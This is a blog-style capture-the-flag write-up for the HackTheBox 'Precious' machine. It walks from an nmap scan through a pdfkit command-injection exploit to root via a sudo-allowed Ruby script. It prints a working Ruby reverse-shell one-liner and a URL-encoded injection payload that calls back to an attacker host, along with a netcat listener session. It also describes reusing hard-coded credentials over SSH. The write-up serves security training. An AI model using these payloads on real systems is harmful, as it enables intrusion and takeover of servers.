---
title: "HackTheBox Precious" 
date: 2022-12-03T21:07:49+01:00
draft: false
---

Exploit Universal RCE with Ruby YAML.load (versions > 2.7) to gain a reverse shell then
grab hard-coded credentials for a user that has root permissions to run ruby script that lead
to root.
<!--more-->


## **Nmap**

We don’t change good habits and start with nmap scan : 

```
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-03 21:22 CET
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.019s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
```

Only two ports open `ssh:22` and `http:80`. (Don't forget to add precious.htb to your hosts file).

## **HTTP:80**

![image text](/precious_htb_web_page.png)

At first sight it's a simple web page to pdf converter. \
start a simple python web server and convert our web page to pdf while capturing the request 
with burpsuite :

![image text](/to_pdf_precious_htb.png)
It seems to work fine let's see what's running behind with burpsuite.

![image text](/first_capture_burpsuite.png)

The website is doing a POST request to the root with our url parameter \ 
send the request to repeter and catch the response : 

![image text](/second_capture_burpsuite.png)

We see and bunch of information looking at the end an interesting info
alerts me : 
![image text](/third_capture_burpsuite.png)

`Generated by pdfkit v0.8.6`. If we search for pdfkit v0.8.6 exploit, a  **[CVE](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)** that lead
to a command injection. Great let's exploit It !

## **Shell as ruby**
By following the POC : ``http://example.com/?name=#{'%20\`sleep 5`'}``
Trying the command sleep worked for me but now how could we manage to 
get a reverse shell ? \
I thought about replace sleep 5 by a bash reverse shell but I didn't works then 
I remembered that the `X-Runtime` Header was Ruby so instead of generate a bash reverse shell 
I could generate a ruby reverse shell : 

```
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("IP",PORT))'
```

Insert the payload in the url parameter in burpsuite, start a netcat listenner and the request  :

```
url=http://10.10.14.233/?name=#%7B%27%2520%60ruby+-rsocket+-e%27spawn(%22sh%22,[%3ain,%3aout,%3aerr]%3d%3ETCPSocket.new(%2210.10.14.233%22,6666))%27%60%27%7D
```
Within a second a connection should be established to your netcat ! 

```
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 6666                 
listening on [any] 6666 ...
connect to [10.10.14.135] from (UNKNOWN) [10.10.11.189] 39510
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

## **From ruby to henry**
by dive in ruby's home directory we see an unsual directory named : .bundle.
This directory contains a config file with hard-coded credentials for henry use.
Let's try these credentials with ssh : 

```
┌──(kali㉿kali)-[~/Documents/htb/playground]
└─$ ssh henry@precious.htb         
henry@precious.htb's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Dec  4 06:02:19 2022 from 10.10.16.50
henry@precious:~$ 
```

From there we can grab the user flag.

## **Root**

The root part was easy (too much easy) \
`sudo -l` shows us that henry can run a ruby script with root privileges : 

```
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

The `update_dependencies.rb` file load a yaml file (unfortunately some people had fun deleting the file at the time I'm writing this ) in this yaml 
file we could specify a bash reverse shell, just replace the actual reverse shell with yours and` execute the ruby file with sudo`.
Once the file is executed a reverse shell as root should be established.
**Congratz !!! Precious as been rooted**.